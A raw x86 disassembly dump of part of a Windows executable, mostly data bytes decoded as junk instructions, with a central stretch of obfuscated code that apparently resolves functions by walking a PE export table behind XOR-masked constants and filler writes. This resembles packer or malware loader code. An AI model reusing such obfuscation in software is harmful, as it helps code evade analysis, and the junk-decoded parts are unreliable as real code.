  40638d:	sar    DWORD PTR [edx+0x685ea085],0x85
  406394:	inc    ecx
  406395:	out    dx,al
  406396:	add    ebp,DWORD PTR [ebp-0x1d250c99]
  40639c:	or     BYTE PTR [esi],cl
  40639e:	adc    edx,ebp
  4063a0:	inc    ecx
  4063a1:	cmp    cl,BYTE PTR [ecx]
  4063a3:	push   ds
  4063a4:	fadd   QWORD PTR [esi+0x68905a71]
  4063aa:	rcl    BYTE PTR [ecx-0x5acbb77e],0x70
  4063b1:	test   dl,cl
  4063b3:	xchg   esi,eax
  4063b4:	adc    edi,edi
  4063b6:	push   eax
  4063b7:	test   eax,0x94739917
  4063bc:	mov    edx,ecx
  4063be:	adc    ch,BYTE PTR [edi]
  4063c0:	data16 cli 
  4063c2:	mov    eax,ds:0x2dcc1328
  4063c7:	lds    edx,FWORD PTR [edi+0x2f07abfe]
  4063cd:	jecxz  0x406431
  4063cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063d0:	stos   DWORD PTR es:[edi],eax
  4063d1:	imul   edi,DWORD PTR ds:0x3087d5fa,0xffffff94
  4063d8:	nop
  4063d9:	scas   eax,DWORD PTR es:[edi]
  4063da:	cli    
  4063db:	ins    DWORD PTR es:[edi],dx
  4063dc:	enter  0x243b,0xa0
  4063e0:	fsubr  DWORD PTR [ecx-0x105289df]
  4063e6:	call   0xa2f5:0xc7307b6b
  4063ed:	popf   
  4063ee:	xlat   BYTE PTR ds:[ebx]
  4063ef:	sbb    DWORD PTR [edi-0x25e3e95e],ebx
  4063f5:	bound  esi,QWORD PTR [edx+0x77]
  4063f8:	cmp    BYTE PTR [edx-0x36],0xe8
  4063fc:	xchg   ecx,eax
  4063fd:	xor    BYTE PTR [eax-0x44aa7d3b],ah
  406403:	out    dx,al
  406404:	arpl   WORD PTR [ebp+0x79],bx
  406407:	nop
  406408:	mov    esp,esp
  40640a:	cmp    BYTE PTR [esi],dl
  40640c:	jnp    0x40645b
  40640e:	xor    al,0x43
  406410:	cld    
  406411:	popa   
  406412:	jmp    0x2d4272eb
  406417:	rcr    BYTE PTR [eax-0x199e2510],0xcf
  40641e:	hlt    
  40641f:	sbb    al,0xa6
  406421:	jmp    0xa350:0x847d6899
  406428:	jno    0x406483
  40642a:	cdq    
  40642b:	or     BYTE PTR [edx+0x73dbbb88],bh
  406431:	or     dh,ch
  406433:	cmp    eax,0x21cafb1a
  406438:	mov    edi,0x85e52626
  40643d:	(bad)  
  40643e:	mov    ah,ah
  406440:	or     BYTE PTR [eax+0x7beef21c],dl
  406446:	and    eax,0xce1dfd83
  40644b:	(bad)  
  40644c:	cdq    
  40644d:	and    eax,0x3820e77d
  406452:	inc    ebx
  406453:	rol    DWORD PTR [ebx],1
  406455:	outs   dx,BYTE PTR ds:[esi]
  406456:	adc    bl,BYTE PTR [ecx+0x11a78da7]
  40645c:	popf   
  40645d:	arpl   WORD PTR [ebx+0x1985ad49],ax
  406463:	pop    eax
  406464:	imul   ebx,DWORD PTR [ebx+0x3c544688],0x482fdd18
  40646e:	mov    edi,0xc2640530
  406473:	sbb    al,0xd8
  406475:	and    ecx,DWORD PTR [edi]
  406477:	push   es
  406478:	inc    edi
  406479:	es push 0x79
  40647c:	sub    al,0xe8
  40647e:	std    
  40647f:	inc    eax
  406480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406481:	xchg   ebp,eax
  406482:	pop    edi
  406483:	cmp    ah,BYTE PTR [esi]
  406485:	mov    dl,0x2b
  406487:	xchg   esp,eax
  406488:	mov    eax,ds:0x62f70240
  40648d:	pushf  
  40648e:	das    
  40648f:	mov    eax,ds:0xb36b1fb3
  406494:	sub    al,0x2e
  406496:	pushf  
  406497:	inc    esp
  406498:	les    edx,FWORD PTR [edx+0x4279c6]
  40649e:	sub    esi,0x8
  4064a1:	pop    es
  4064a2:	push   ss
  4064a3:	shl    BYTE PTR [esi+edx*1+0xb5528f6],1
  4064aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ac:	not    DWORD PTR [ecx+eax*1]
  4064af:	xor    al,0xb9
  4064b1:	pop    ss
  4064b2:	hlt    
  4064b3:	cmp    eax,0xa48c3cac
  4064b8:	test   bh,ch
  4064ba:	fcmovnu st,st(6)
  4064bc:	imul   esp,DWORD PTR [esi-0x41b70b9],0x5b
  4064c3:	repz inc ebx
  4064c5:	fldenv [edi-0xf]
  4064c8:	stos   DWORD PTR es:[edi],eax
  4064c9:	dec    edi
  4064ca:	sbb    esp,DWORD PTR [ecx]
  4064cc:	cmp    eax,0xdddc82e6
  4064d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d2:	inc    edx
  4064d3:	int3   
  4064d4:	retf   
  4064d5:	fs jne 0x4064f2
  4064d8:	inc    ecx
  4064d9:	xchg   ebx,eax
  4064da:	retf   0xbbe
  4064dd:	cdq    
  4064de:	jnp    0x4064e3
  4064e0:	push   es
  4064e1:	rcl    esp,1
  4064e3:	inc    edx
  4064e4:	push   cs
  4064e5:	sub    BYTE PTR [esi],dl
  4064e7:	mov    ch,0x65
  4064e9:	jle    0x4064a2
  4064eb:	pop    ss
  4064ec:	mov    bl,0x8b
  4064ee:	or     DWORD PTR [eax+0x7c97d74f],esi
  4064f4:	xchg   BYTE PTR ds:0x231232b0,dh
  4064fa:	push   eax
  4064fb:	sahf   
  4064fc:	cmp    BYTE PTR [edi-0x64],0x73
  406500:	addr16 mov eax,ds:0x6816
  406504:	les    eax,FWORD PTR [ebx-0x4e]
  406507:	pop    edi
  406508:	in     ax,0xbc
  40650b:	and    bl,ah
  40650d:	and    cl,BYTE PTR [ebx-0x43]
  406510:	and    DWORD PTR [edx+0x60ce3dc0],0x6e4677f2
  40651a:	push   edx
  40651b:	je     0x406593
  40651d:	sub    DWORD PTR es:[ebp+0x37],0xffffff8e
  406522:	jne    0x4064d3
  406524:	mov    ecx,0xae61802c
  406529:	mov    ebp,0xaff4dc59
  40652e:	ss ds mov ecx,0xb2a932b2
  406535:	cmp    DWORD PTR [ebx],esi
  406537:	ja     0x406546
  406539:	(bad)  
  40653b:	iret   
  40653c:	sbb    DWORD PTR [ebp-0x38],ebp
  40653f:	pop    edx
  406540:	pushf  
  406541:	imul   edi,DWORD PTR [ecx+0x7b0863c8],0x9fc10ae6
  40654b:	retf   
  40654c:	cmp    al,0x30
  40654e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40654f:	cld    
  406550:	pop    ds
  406551:	jnp    0x4064e7
  406553:	mov    ecx,0xf05422f6
  406558:	stos   BYTE PTR es:[edi],al
  406559:	mov    ds:0xca1872fa,eax
  40655e:	fimul  WORD PTR [esi-0x555a1ece]
  406564:	scas   al,BYTE PTR es:[edi]
  406565:	sub    DWORD PTR [eax+eax*8+0x207b08ce],ecx
  40656c:	pop    ebp
  40656d:	or     ch,dh
  40656f:	int    0x3d
  406571:	es dec ecx
  406573:	push   eax
  406574:	add    BYTE PTR [edx+0x54],ah
  406577:	mul    ah
  406579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657a:	push   cs
  40657b:	cmp    BYTE PTR [edx],cl
  40657d:	je     0x4065ae
  40657f:	lahf   
  406580:	fisubr WORD PTR [edi]
  406582:	push   ss
  406583:	cmp    bl,BYTE PTR [edi-0x5e3e6587]
  406589:	push   edx
  40658a:	jge    0x406605
  40658c:	mov    eax,ds:0xb8ef4d2c
  406591:	sbb    eax,0x2ffc61db
  406596:	sar    esp,0x4b
  406599:	in     al,0x48
  40659b:	mov    edx,ds
  40659d:	leave  
  40659e:	loopne 0x406573
  4065a0:	pop    ebp
  4065a1:	add    DWORD PTR [ebx+0x18679ad0],ecx
  4065a7:	(bad)  
  4065a8:	out    0x5a,al
  4065aa:	mov    ds:0xf979baf,al
  4065af:	std    
  4065b0:	pop    ebp
  4065b1:	scas   eax,DWORD PTR es:[edi]
  4065b2:	fnstcw WORD PTR [ebp-0x2e]
  4065b5:	ret    
  4065b6:	mov    edx,DWORD PTR [eax+ebp*8]
  4065b9:	sub    eax,edx
  4065bb:	das    
  4065bc:	iret   
  4065bd:	xor    DWORD PTR [ebp-0x17],edi
  4065c0:	jae    0x40658a
  4065c2:	dec    eax
  4065c3:	xchg   ebp,eax
  4065c4:	jmp    0xace3f306
  4065c9:	fwait
  4065ca:	lds    eax,FWORD PTR [eax-0x2c96a361]
  4065d0:	mov    ecx,0x330a098f
  4065d5:	cmc    
  4065d6:	or     DWORD PTR [ebx],esi
  4065d8:	push   eax
  4065d9:	popa   
  4065da:	call   0x39f51ad6
  4065df:	dec    eax
  4065e0:	stos   BYTE PTR es:[edi],al
  4065e1:	call   0x156:0xef1f403e
  4065e8:	xlat   BYTE PTR ds:[ebx]
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x60],0xc9
  4069c2:	jl     0x4069e9
  4069c4:	ret    0x623c
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x3d]
  4069cd:	fs (bad) 
  4069d0:	loop   0x406a0b
  4069d2:	adc    esi,esi
  4069d4:	lock ficomp WORD PTR [ecx-0x69bc50fb]
  4069db:	ret    
  4069dc:	iret   
  4069dd:	mov    al,0xac
  4069df:	popf   
  4069e0:	js     0x406a09
  4069e2:	popa   
  4069e3:	inc    ebx
  4069e4:	pop    ebx
  4069e5:	xor    eax,0x7e9f3d61
  4069ea:	aam    0x77
  4069ec:	add    BYTE PTR [eax+0x16],bl
  4069ef:	adc    ecx,DWORD PTR [ebx+0x6ed5c5a9]
  4069f5:	(bad)  
  4069f6:	mov    ecx,0xe310585d
  4069fb:	dec    edx
  4069fc:	dec    esp
  4069fd:	add    al,0x9
  4069ff:	push   ss
  406a00:	in     eax,dx
  406a01:	imul   esi,DWORD PTR [edi-0x13d0195d],0x933bcfc8
  406a0b:	push   eax
  406a0c:	lods   al,BYTE PTR ds:[esi]
  406a0d:	icebp  
  406a0e:	push   ebx
  406a0f:	adc    BYTE PTR [esi+0x58a5c0be],cl
  406a15:	stc    
  406a16:	hlt    
  406a17:	push   cs
  406a18:	outs   dx,BYTE PTR ds:[esi]
  406a19:	inc    esp
  406a1a:	fmulp  st(4),st
  406a1c:	mov    ch,0xbc
  406a1e:	retf   0xb9f5
  406a21:	aad    0x34
  406a23:	rcr    DWORD PTR [ebx-0x423b224d],cl
  406a29:	jle    0x406a53
  406a2b:	mov    eax,0xf2358fe6
  406a30:	mov    bh,0xda
  406a32:	xchg   esi,eax
  406a33:	and    eax,0x2b786130
  406a38:	ins    DWORD PTR es:[edi],dx
  406a39:	shl    BYTE PTR [edi-0x46],0x11
  406a3d:	mov    ebp,0xe71a209
  406a42:	cmp    al,0x4c
  406a44:	or     ebp,DWORD PTR [edi-0x5fd248d7]
  406a4a:	icebp  
  406a4b:	mov    eax,0xa9ea0b3c
  406a50:	popa   
  406a51:	push   0xfffffffd
  406a53:	fmul   st(3),st
  406a55:	psrld  mm0,QWORD PTR [esi+0x4a139b9a]
  406a5c:	aad    0xa4
  406a5e:	out    0x32,al
  406a60:	and    dl,BYTE PTR [ecx]
  406a62:	xor    al,0x0
  406a64:	retf   
  406a65:	aaa    
  406a66:	aad    0x21
  406a68:	cmp    BYTE PTR [eax],bh
  406a6a:	cmp    DWORD PTR [ebx],esp
  406a6c:	or     al,0x3a
  406a6e:	jae    0x406a7b
  406a70:	rcl    DWORD PTR [edx-0x2f06e751],0xad
  406a77:	xchg   ecx,eax
  406a78:	(bad)  
  406a79:	jecxz  0x406adc
  406a7b:	(bad)  
  406a7c:	or     DWORD PTR [esi-0x52],edi
  406a7f:	jle    0x406ac5
  406a81:	repnz stc 
  406a83:	test   al,0xbf
  406a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a86:	sbb    al,0x9c
  406a88:	xchg   DWORD PTR [ebp-0x702bd3c7],eax
  406a8e:	dec    ebx
  406a8f:	ret    0xb372
  406a92:	leave  
  406a93:	push   esi
  406a94:	sub    DWORD PTR [ebp+0x4a08da9a],edx
  406a9a:	dec    esp
  406a9b:	mov    ebp,cs
  406a9d:	rcr    BYTE PTR [esi+0xd235ee0],0x4a
  406aa4:	dec    ecx
  406aa5:	adc    eax,0xd369721e
  406aaa:	jge    0x406b28
  406aac:	and    esp,DWORD PTR [esi]
  406aae:	ds add edi,ebx
  406ab1:	int    0xe5
  406ab3:	in     al,0x8f
  406ab5:	test   DWORD PTR [eax],edi
  406ab7:	xchg   BYTE PTR [esi-0x7743ba32],cl
  406abd:	lahf   
  406abe:	jb     0x406adb
  406ac0:	imul   eax,DWORD PTR [eax+0x1a88c505],0xa6b7f83
  406aca:	mov    eax,ds:0x6efc4408
  406acf:	ret    0xcd8f
  406ad2:	add    al,0x85
  406ad4:	out    0x37,eax
  406ad6:	xlat   BYTE PTR ds:[ebx]
  406ad7:	jae    0x406a65
  406ad9:	(bad)
  406adc:	xor    ch,cl
  406ade:	mov    cs,WORD PTR [edi]
  406ae0:	jmp    0x6b964f38
  406ae5:	stc    
  406ae6:	dec    esp
  406ae7:	xchg   ebp,eax
  406ae8:	sbb    eax,0x2303d64e
  406aed:	mov    bl,0x4e
  406aef:	inc    ebx
  406af0:	mov    edi,0x533a02fd
  406af5:	ret    
  406af6:	jno    0x406b30
  406af8:	sub    BYTE PTR [esi+0x79],al
  406afb:	sbb    dl,BYTE PTR [esi+0x6e883e96]
  406b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b02:	sbb    al,0xbf
  406b04:	jle    0x406b19
  406b06:	test   eax,0x9ad4b790
  406b0b:	add    DWORD PTR [eax-0x7386b647],ebx
  406b11:	mov    al,0xc5
  406b13:	push   cs
  406b14:	fidiv  DWORD PTR [ecx+edi*1]
  406b17:	rcr    BYTE PTR [edx],cl
  406b19:	xchg   ebx,eax
  406b1a:	dec    edi
  406b1b:	jp     0x406ad2
  406b1d:	clc    
  406b1e:	mov    edi,0x1f057050
  406b23:	aaa    
  406b24:	mov    dl,0x6c
  406b26:	mov    ebp,0x6f324dec
  406b2b:	pop    edi
  406b2c:	sub    al,0x1b
  406b2e:	out    dx,eax
  406b2f:	mov    edx,0xf1fa0e1e
  406b34:	loope  0x406abc
  406b36:	dec    ecx
  406b37:	jle    0x406b96
  406b39:	pop    ebx
  406b3a:	lods   al,BYTE PTR ds:[esi]
  406b3b:	jnp    0x406b53
  406b3d:	adc    DWORD PTR [ecx-0x2d48536f],0xffffffd4
  406b44:	dec    edi
  406b45:	add    BYTE PTR ds:0x88e48410,0x2d
  406b4c:	mov    ecx,0xc9e4bba6
  406b51:	jnp    0x406b83
  406b53:	mov    ch,0xf1
  406b55:	jmp    0x6632:0x589a3184
  406b5c:	mov    ds:0xf7930717,eax
  406b61:	cmc    
  406b62:	ins    BYTE PTR es:[edi],dx
  406b63:	aas    
  406b64:	cmp    bh,al
  406b66:	stos   DWORD PTR es:[edi],eax
  406b67:	in     al,dx
  406b68:	xor    DWORD PTR [edx],ecx
  406b6a:	jb     0x406be3
  406b6c:	xor    esi,DWORD PTR [ebx+0x5b]
  406b6f:	jge    0x406b56
  406b71:	test   eax,0xca3ae224
  406b76:	cli    
  406b77:	push   ds
  406b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b79:	xor    edi,DWORD PTR [ecx-0x2fd712e6]
  406b7f:	cdq    
  406b80:	ret    
  406b81:	xchg   ecx,eax
  406b82:	mov    dh,0x2c
  406b84:	jl     0x406bd7
  406b86:	cwde   
  406b87:	sahf   
  406b88:	or     al,0x84
  406b8a:	pop    esi
  406b8b:	xchg   edi,eax
  406b8c:	xchg   ecx,eax
  406b8d:	neg    DWORD PTR [esi-0x3188bd52]
  406b93:	inc    esi
  406b94:	and    edi,DWORD PTR [ecx+0x17991084]
  406b9a:	jecxz  0x406b78
  406b9c:	imul   ebx,DWORD PTR [ebp-0x6486fee5],0x7edcd454
  406ba6:	rcl    BYTE PTR [edi],cl
  406ba8:	ins    DWORD PTR es:[edi],dx
  406ba9:	fpatan 
  406bab:	add    al,0x97
  406bad:	jmp    0x406bd6
  406baf:	xchg   esp,eax
  406bb0:	pop    esi
  406bb1:	mov    ah,0x9c
  406bb3:	mov    WORD PTR [ebp-0x1e],?
  406bb6:	add    bh,BYTE PTR [ebx+0x65]
  406bb9:	dec    ecx
  406bba:	into   
  406bbb:	fs jae 0x406be0
  406bbe:	cwde   
  406bbf:	or     BYTE PTR [edi],bl
  406bc1:	mov    ebx,0x17a735ca
  406bc6:	dec    esp
  406bc7:	pop    eax
  406bc8:	push   cs
  406bc9:	sahf   
  406bca:	sahf   
  406bcb:	loopne 0x406be1
  406bcd:	dec    ebp
  406bce:	fnstsw WORD PTR [edx+0x66]
  406bd1:	pop    esp
  406bd2:	mov    eax,ds:0xf300f2cd
  406bd7:	mov    dh,0xfb
  406bd9:	add    al,0x2a
  406bdb:	fisub  DWORD PTR [eax-0x13]
  406bde:	and    BYTE PTR [edi+ebx*4+0x6a003f87],dh
  406be5:	jno    0x406b77
  406be7:	xor    edx,DWORD PTR [edx]
  406be9:	aam    0xb3
  406beb:	cli    
  406bec:	das    
  406bed:	xchg   BYTE PTR [edi-0x2c],bh
  406bf0:	ins    BYTE PTR es:[edi],dx
  406bf1:	dec    ebp
  406bf2:	sub    ecx,DWORD PTR [edx-0x5181fcd5]
  406bf8:	pop    ecx
  406bf9:	jl     0x406c26
  406bfb:	fxam   
  406bfd:	stos   BYTE PTR es:[edi],al
  406bfe:	aas    
  406bff:	loopne 0x406c54
  406c01:	and    eax,0xa5413de
  406c06:	dec    edi
  406c07:	mov    dl,BYTE PTR [ebx]
  406c09:	sbb    BYTE PTR [ebx],0x36
  406c0c:	data16 and al,0x12
  406c0f:	cli    
  406c10:	retf   
  406c11:	xor    edx,DWORD PTR [eax]
  406c13:	mov    dh,0x41
  406c15:	gs jns 0x406c57
  406c18:	retf   0xe1af
  406c1b:	(bad)  [edx-0x35de822d]
  406c21:	leave  
  406c22:	dec    ecx
  406c23:	cmp    DWORD PTR [ebp+0x35],esi
  406c26:	addr16 popf 
  406c28:	sbb    BYTE PTR [ebx],dl
  406c2a:	outs   dx,DWORD PTR ds:[esi]
  406c2b:	add    al,0xf2
  406c2d:	pop    ebx
  406c2e:	adc    dh,dl
  406c30:	sahf   
  406c31:	adc    ecx,edi
  406c33:	and    BYTE PTR [ebp+0x60],0xa0
  406c37:	aas    
  406c38:	imul   edi,DWORD PTR [esi+0x6244cac],0xe14f6ca2
  406c42:	add    al,cl
  406c44:	jl     0x406c57
  406c46:	xchg   BYTE PTR [ebx+ecx*8+0x7c12bf19],cl
  406c4d:	inc    edi
